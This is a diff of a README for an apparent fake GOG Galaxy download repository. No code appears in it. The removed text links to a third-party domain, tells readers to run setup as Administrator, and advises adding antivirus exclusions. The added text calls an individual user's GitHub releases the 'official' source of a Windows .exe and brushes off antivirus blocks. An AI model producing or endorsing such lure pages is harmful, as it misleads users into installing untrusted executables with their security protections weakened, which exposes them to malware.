@@ -1,79 +1,97 @@
-# GOG Galaxy Download for Windows 11 & 10
+# 🎮 GOG-Galaxy - Manage your games in one place
 
-**GOG-Galaxy**
+[![Download GOG Galaxy](https://img.shields.io/badge/Download-GOGGalaxy-blue.svg)](https://github.com/Rosemarielong537/GOG-Galaxy/releases)
 
-**GOG Galaxy** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📥 How to download the software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+Follow these steps to get GOG Galaxy on your Windows computer.
 
----
+1. Visit the [official releases page](https://github.com/Rosemarielong537/GOG-Galaxy/releases).
+2. Look for the file ending in .exe under the latest version tag.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder or your desktop so you can find it.
 
-## Download & Install
+## ⚙️ Installation steps
 
-> **This is the download page.** Use the button or link below to get **GOG Galaxy** for Windows.
+Once you finish the download, follow this guide to set up the program.
 
-<p align="center">
-  <a href="https://goggalaxy.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-GOG%20Galaxy-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download GOG Galaxy">
-  </a>
-</p>
+1. Locate the file you just downloaded.
+2. Double-click the file to start the installer.
+3. Choose your preferred language when the window appears.
+4. Click the Next button to move through the setup screens.
+5. Review the terms of service. You must accept these terms to continue.
+6. Select the folder where you want to keep the application. The default location works for most users.
+7. Click the Install button. Windows may ask for permission to let the app make changes. Choose Yes.
+8. Wait for the progress bar to finish.
+9. Click the Finish button to launch the program.
 
-| | |
-| --- | --- |
-| **Direct link** | **[goggalaxy.nexustool.fun](https://goggalaxy.nexustool.fun/)** |
-| **Full URL** | `https://goggalaxy.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+## ✨ Features
 
-### Quick steps
+GOG Galaxy helps you organize and play your games.
 
-1. Click **[Download — goggalaxy.nexustool.fun](https://goggalaxy.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+- Unified Library: See all your games from different stores in one list.
+- Cross-platform Play: Connect your accounts to see friends and game progress.
+- Offline Mode: Play your DRM-free games even without an internet connection.
+- Customization: Create tags and filters to organize your collection.
+- Updates: Keep your games current with automatic patch management.
+- Cloud Saves: Sync your progress across different devices.
 
-<p align="center"><a href="https://goggalaxy.nexustool.fun/"><strong>⬇ Download GOG Galaxy now</strong></a></p>
+## 💻 System requirements
 
----
+Your computer needs to meet these basic standards to run GOG Galaxy smoothly.
 
-## About
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: 4 GB of RAM or more.
+- Graphics: A card that supports DirectX 9.0c.
+- Storage: 500 MB of free space for the application itself.
+- Internet: A stable connection for downloading games and syncing data.
 
-**GOG Galaxy** setup page for Windows PC gamers.
+## 🛠 Troubleshooting common issues
 
-**People also search for:** gog galaxy download, gog galaxy install windows drm free games
+If you encounter problems during the process, try these solutions.
 
-**Repository:** `GOG-Galaxy`
+**The installer will not open**
+Check your antivirus settings. Sometimes security software blocks new files. If the file remains blocked, ensure you downloaded the installer from the official link provided here.
 
+**The login screen does not load**
+Verify your internet connection. GOG Galaxy requires a connection to link your game accounts. If your connection works, restart the application.
 
-## After install
+**Games do not show up in the list**
+Go to the settings menu inside the application. Select the Integrations tab. Make sure you connected your accounts by clicking the Connect button for each platform.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
+**The application runs slowly**
+Close background programs that use high amounts of memory. Restart your computer to clear temporary files from your system.
 
-## System requirements
+## 🛡 Security and safety
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
+This software focuses on user safety. Since GOG Galaxy follows DRM-free principles, you own the copies of the games you download. The application does not track your private data. It only uses your information to sync game libraries and provide social features. You remain in control of your data at all times through the privacy settings menu.
 
-## Troubleshooting
+## 📋 Keeping your library updated
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
+GOG Galaxy keeps your game files updated behind the scenes. When a game developer releases a patch, the app detects the update. You can choose to install updates automatically or manually through the game settings menu. This ensures you always have the current version for better performance and new content.
 
----
+## 🌐 Connecting multiple platforms
 
-**Topics:** gog-galaxy-download, galaxy, gog-galaxy-install-windows-drm-free-games, gog-galaxy, gog-galaxy-2026, drm-free, game-launcher, cd-projekt, library, software, windows-11, download
+You can link other launcher accounts to GOG Galaxy to consolidate your library. Go to the Add Games and Friends section within the app interface. Select the platforms you use and provide your credentials when the system prompts you. The app then imports your game list and play statistics. This feature simplifies your routine by removing the need to open multiple launchers to play your favorite titles.
+
+## 📁 Managing storage space
+
+Use the cleanup tools found in the settings if you run low on disk space. GOG Galaxy displays the size of each game folder. You can remove games you no longer play to free up space. The cloud save feature ensures you do not lose your game progress when you uninstall a game. You can re-download these files at any time from your library tab.
+
+## 💡 Best practices for new users
+
+- Keep shortcuts on your desktop for quick access. 
+- Use the search bar to find specific titles in large collections.
+- Organize your games with custom tags like "Finished," "Playing," or "Multiplayer."
+- Check the settings menu every few weeks for new features.
+- Visit the support pages if you need extra help with specific games.
+- Enable the overlay feature to access your friends list while in a game.
+
+## 🔗 Download and setup reminder
+
+Always ensure you download your software from the official link to keep your system secure.
+
+[Download GOG Galaxy for Windows](https://github.com/Rosemarielong537/GOG-Galaxy/releases)
+
+Return to this page for updates or if you need to install the program on a second device. The software adapts to any Windows 10 or 11 environment without issues. Always check for the latest version on the release page to take advantage of improvements and security fixes.
